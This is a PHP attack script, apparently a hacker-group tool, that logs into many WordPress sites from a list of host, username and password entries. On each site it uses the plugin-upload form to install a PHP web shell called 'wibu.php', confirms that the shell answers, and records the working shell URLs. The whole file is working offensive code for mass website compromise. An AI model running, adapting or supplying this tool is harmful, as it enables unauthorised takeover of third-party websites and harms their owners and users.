<?php
/*
 * @Wibuheker | Wordpress Upload Shell
 * 
 * This tool build by Wibu Heker.
 * if u want recode, please dont delete copyright.
 * 
 * Copyrigt Wibu Heker.
 * 
 * Powered By Rintod.DEV
 */
require_once 'WibuHeker/Curl.php';
require_once 'WibuHeker/Lib.php';
$lib = new Library();
enterList:
$list = readline('[+] Input List: ');
if (empty($list) || !file_exists($list))
{
    echo $lib::setColor()['RD'] . "List Not Found!" . $lib::setColor()['WH'] . "\n";
    goto enterList;
}

$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($list))));
$send = new Curl();
foreach($lists as $lis)
{
    if ($lis == '') continue;
    list($host, $user, $pass) = explode("|", $lis, 3);
    $host = str_replace('/wp-login.php', '', $host);
    $send::$URL = $host . "/wp-login.php";
    $send::MakeRequests();
    $send::setHeaders(array(
        "Cookie: wordpress_test_cookie=WP+Cookie+check"
    ));
    $send::setTimeout(10);
    $send::Cookies('cookie/' . microtime() . '-Cookies.txt');
    $send::Follow();
    $send::POST("log=$user&pwd=$pass&wp-submit=Log+In&redirect_to=$host/wp-admin/&testcookie=1");
    $coeg = $send::Body();
    if (preg_match('/wp-admin-bar/', $coeg))
    {
        $send::$URL = $host . "/wp-admin/plugin-install.php?tab=upload";
        $send::GET();
        if (preg_match('|<input type="hidden" name="_wp_http_referer" value="|', $send::Body()))
        {
            preg_match_all('/<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"/m', $send::Body(), $nonces);
            $nonce = $nonces[1][0];
            $file = new CurlFile("wibu.php");
            $data = array(
                "_wpnonce" => $nonce,
                "_wp_http_referer" => "/wp-admin/plugin-install.php",
                "pluginzip" => $file,
                "install-plugin-submit" => "Install+Now"
            );
            $send::$URL = $host . "/wp-admin/update.php?action=upload-plugin";
            $send::POST($data);
            if (preg_match('/wp-admin-bar/', $send::Body()))
            {
                $tahun = date('Y');
                $bulan = date('m');
                $send::$URL = $host . "/wp-content/uploads/" . $tahun . "/" . $bulan ."/wibu.php";
                $send::GET();
                if (preg_match('/azzatssins/', $send::Body()))
                {
                    echo $host . "/wp-content/uploads/" . $tahun . "/" . $bulan . "/wibu.php | " . $lib::setColor()['GRN'] . "Success Upload Shell!" . $lib::setColor()['WH'] . "\n"; 
                    $lib::Save("wibuheker-shell.txt", $host . "/wp-content/uploads/" . $tahun . "/" . $bulan . "/wibu.php");
                }
                else {
                    echo $host . " | " . $lib::setColor()['RD'] . "Upload Failed! Manual Please :)" . $lib::setColor()['WH'] . "\n";
                    $lib::Save("wibuheker-manual.txt", $lis);
                }
            }
        }
        else {
            echo $host . " | " . $lib::setColor()['RD'] . "Session Expired! Manual Please :)" . $lib::setColor()['WH'] . "\n";
            $lib::Save("wibuheker-manual.txt", $lis);
        }
    }
    else {
        echo $host . " | " . $lib::setColor()['RD'] . "Login Failed!" . $lib::setColor()['WH'] . "\n";
    }
}
